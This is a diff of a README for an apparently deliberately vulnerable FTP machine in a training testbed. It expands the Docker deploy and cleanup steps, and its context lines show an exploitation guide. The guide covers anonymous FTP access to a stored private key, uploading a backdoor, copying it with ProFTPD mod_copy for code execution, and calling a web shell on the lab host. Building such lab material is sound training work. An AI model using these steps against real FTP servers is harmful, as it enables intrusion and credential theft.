@@ -8,20 +8,66 @@ Machine 3 in the VulnCorp Enterprise testbed simulates an FTP server in the **DM
 
 ## 🚀 Quick Start (One-Command Deploy)
 
-Run this on your **Debian 13 VM** (`10.10.10.30`):
+Run this on your **Ubuntu / Debian VM** (tested on Ubuntu 24.04):
 
 ```bash
-git clone https://github.com/YOUR_GITHUB_USERNAME/webserver.git
-cd webserver/machines/dmz-ftp01
+# 1. Clone the repo to your VM
+git clone https://github.com/sowmyacs25/Webserver.git
 
+# 2. Enter the FTP machine folder
+cd Webserver/machines/dmz-ftp01
+
+# 3. Make the deploy script executable
 chmod +x deploy.sh
+
+# 4. Deploy (installs Docker if missing, cleans old cache, builds, starts)
 sudo ./deploy.sh
 ```
 
-Or deploy directly via Docker Compose:
+---
+
+## 🛠️ Manual Deploy (Step-by-Step)
+
+If you prefer to run each step yourself, or `deploy.sh` fails for any reason:
+
 ```bash
-docker compose up -d --build
+# 1. Navigate into the machine folder
+cd Webserver/machines/dmz-ftp01
+
+# 2. Stop and remove any previous container, image, and volume for this machine
+#    (prevents leftover state from breaking the new build)
+sudo docker compose down --rmi all --volumes --remove-orphans
+
+# 3. Wipe Docker's build cache completely
+#    (forces every layer to rebuild from scratch — no stale Dockerfile sneaks in)
+sudo docker builder prune -af
+
+# 4. Remove any unused containers, networks, and dangling images globally
+#    (frees disk space and prevents port/name conflicts)
+sudo docker system prune -af
+
+# 5. Build the image from the Dockerfile without using any cached layers
+sudo docker compose build --no-cache
+
+# 6. Start the container in detached mode (runs in the background)
+sudo docker compose up -d
+
+# 7. Tail the startup logs — you should see all 4 services LISTENING
+sudo docker compose logs
 ```
+
+### Why each cleanup command matters
+
+| Command | What it does | Why we need it |
+|---|---|---|
+| `docker compose down --rmi all --volumes --remove-orphans` | Stops and removes the container, its image, its volumes, and any leftover "orphan" containers from old versions | Prevents leftover state from a previous broken build affecting the new one |
+| `docker builder prune -af` | Deletes **all** cached build layers | If a layer from an old broken Dockerfile is cached, Docker reuses it and you get the same error again — this wipes it |
+| `docker system prune -af` | Removes stopped containers, unused networks, dangling images | Frees disk space and prevents port/name conflicts on future deploys |
+| `docker compose build --no-cache` | Builds the image **ignoring all cache** | Guarantees the build uses the current Dockerfile, not a cached older one |
+| `docker compose up -d` | Starts the container in the background | `-d` = detached, so you get your terminal back |
+
+> **Note:** `sudo` is required unless your user is in the `docker` group.
+> To add yourself: `sudo usermod -aG docker $USER`, then log out and back in.
 
 ---
 
@@ -40,6 +86,7 @@ docker compose up -d --build
 ## 🔍 Attack Vectors & Exploitation Guide
 
 ### 1. Anonymous FTP Login & Information Gathering
+
 ```bash
 ftp 10.10.10.30 21
 # Name: anonymous
@@ -55,6 +102,7 @@ ftp> get backup_rsa
 ```
 
 ### 2. Anonymous Write (File Upload)
+
 ```bash
 ftp 10.10.10.30 21
 ftp> cd pub
@@ -62,6 +110,7 @@ ftp> put my_backdoor.sh
 ```
 
 ### 3. ProFTPD `mod_copy` Unauthenticated File Copy (RCE)
+
 ```bash
 telnet 10.10.10.30 2121
 SITE CPFR /var/ftp/pub/my_backdoor.php
@@ -82,6 +131,15 @@ curl http://10.10.10.30/shell.php
 
 ## 🧹 Teardown & Cleanup
 
+Stop the container, remove the built image and volumes, and wipe the build cache:
+
 ```bash
-docker compose down --rmi all --volumes
+# Stop and remove the container + its image + its volumes
+sudo docker compose down --rmi all --volumes
+
+# Optional: clear Docker's build cache to free disk space
+sudo docker builder prune -af
+
+# Optional: remove all unused containers, networks, images globally
+sudo docker system prune -af
 ```
